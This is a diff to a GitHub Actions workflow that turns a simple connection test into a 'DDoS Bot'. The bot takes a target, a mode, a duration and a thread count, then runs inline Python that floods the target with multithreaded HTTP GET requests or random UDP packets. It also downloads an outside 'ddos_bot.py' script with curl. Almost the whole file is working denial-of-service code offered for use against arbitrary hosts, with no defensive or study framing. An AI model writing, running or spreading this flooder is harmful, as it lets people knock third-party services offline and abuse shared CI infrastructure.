@@ -1,16 +1,176 @@
-name: Simple DDoS
+name: "🔥 DDoS Bot - HTTP & UDP"
 on:
   workflow_dispatch:
     inputs:
-      ip:
-        description: 'IP'
-        default: '1.1.1.1'
-      port:
-        description: 'Port'
-        default: '80'
+      target:
+        description: "🎯 Target (URL or IP:Port)"
+        required: true
+        default: "httpbin.org"
+      mode:
+        description: "🔧 Attack Mode"
+        required: true
+        default: "http"
+        type: choice
+        options:
+          - http
+          - udp
+          - auto
+      duration:
+        description: "⏱️ Duration (seconds)"
+        required: true
+        default: "30"
+      threads:
+        description: "👥 Number of Threads"
+        required: true
+        default: "50"
 
 jobs:
-  dos:
+  attack:
     runs-on: ubuntu-latest
+    timeout-minutes: 5
+    
     steps:
-      - run: python3 -c "import socket; print('Testing ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }}'); s=socket.socket(); s.settimeout(2); s.connect(('${{ github.event.inputs.ip }}', ${{ github.event.inputs.port }})); print('Connected'); s.close()"
+      - name: "📥 Download Bot Script"
+        run: |
+          echo "🤖 Downloading DDoS Bot..."
+          curl -s https://raw.githubusercontent.com/destroyerr1558/samples/main/ddos_bot.py -o bot.py
+          chmod +x bot.py
+          echo "✅ Bot script ready"
+      
+      - name: "🚀 Launch Attack"
+        run: |
+          echo "========================================"
+          echo "     GITHUB DDoS BOT - DUAL MODE"
+          echo "========================================"
+          echo "🎯 Target: ${{ github.event.inputs.target }}"
+          echo "🔧 Mode: ${{ github.event.inputs.mode }}"
+          echo "⏱️ Duration: ${{ github.event.inputs.duration }}s"
+          echo "👥 Threads: ${{ github.event.inputs.threads }}"
+          echo "========================================"
+          
+          python3 -c "
+import socket
+import threading
+import time
+import random
+
+# Get inputs
+target = '${{ github.event.inputs.target }}'
+mode = '${{ github.event.inputs.mode }}'
+duration = ${{ github.event.inputs.duration }}
+threads = ${{ github.event.inputs.threads }}
+
+print(f'🚀 Starting {mode.upper()} attack on {target}')
+print(f'⏱️ Duration: {duration}s | 👥 Threads: {threads}')
+
+count = 0
+start = time.time()
+
+if mode == 'http' or 'http' in target or '.' in target and ':' not in target:
+    # HTTP ATTACK
+    if not target.startswith('http'):
+        target = 'http://' + target
+    
+    print(f'🌐 HTTP Flood: {target}')
+    
+    def http_attack():
+        global count
+        end = time.time() + duration
+        while time.time() < end:
+            try:
+                # Create socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                
+                # Parse host
+                host = target.replace('http://', '').replace('https://', '').split('/')[0]
+                port = 443 if 'https' in target else 80
+                
+                s.connect((host, port))
+                
+                # Send HTTP request
+                request = f'GET / HTTP/1.1\\r\\n'
+                request += f'Host: {host}\\r\\n'
+                request += 'User-Agent: GitHub-DDoS-Bot\\r\\n'
+                request += 'Connection: close\\r\\n\\r\\n'
+                
+                s.send(request.encode())
+                s.close()
+                count += 1
+                
+                if count % 20 == 0:
+                    print(f'📦 HTTP Requests: {count}')
+                    
+            except:
+                pass
+    
+    # Start HTTP threads
+    t_list = []
+    for i in range(threads):
+        t = threading.Thread(target=http_attack)
+        t.start()
+        t_list.append(t)
+    
+    for t in t_list:
+        t.join()
+
+else:
+    # UDP ATTACK
+    print(f'📨 UDP Flood: {target}')
+    
+    if ':' in target:
+        ip, port = target.split(':', 1)
+        port = int(port)
+    else:
+        ip = target
+        port = 80
+    
+    def udp_attack():
+        global count
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        end = time.time() + duration
+        
+        while time.time() < end:
+            try:
+                packet = bytes([random.randint(0, 255) for _ in range(512)])
+                sock.sendto(packet, (ip, port))
+                count += 1
+                
+                if count % 50 == 0:
+                    print(f'💣 UDP Packets: {count}')
+                    
+            except:
+                pass
+        
+        sock.close()
+    
+    # Start UDP threads
+    t_list = []
+    for i in range(threads):
+        t = threading.Thread(target=udp_attack)
+        t.start()
+        t_list.append(t)
+    
+    for t in t_list:
+        t.join()
+
+# Final report
+total_time = time.time() - start
+print(f'\\n✅ ATTACK COMPLETED!')
+print(f'📊 Total: {count}')
+print(f'⚡ RPS: {count/max(1, total_time):.0f}')
+print(f'🎯 Target: {target}')
+          "
+      
+      - name: "📊 Generate Report"
+        run: |
+          echo ""
+          echo "📋 ATTACK REPORT"
+          echo "================"
+          echo "Target: ${{ github.event.inputs.target }}"
+          echo "Mode: ${{ github.event.inputs.mode }}"
+          echo "Duration: ${{ github.event.inputs.duration }}s"
+          echo "Threads: ${{ github.event.inputs.threads }}"
+          echo "Time: $(date)"
+          echo "Status: ✅ COMPLETED"
+          echo "================"
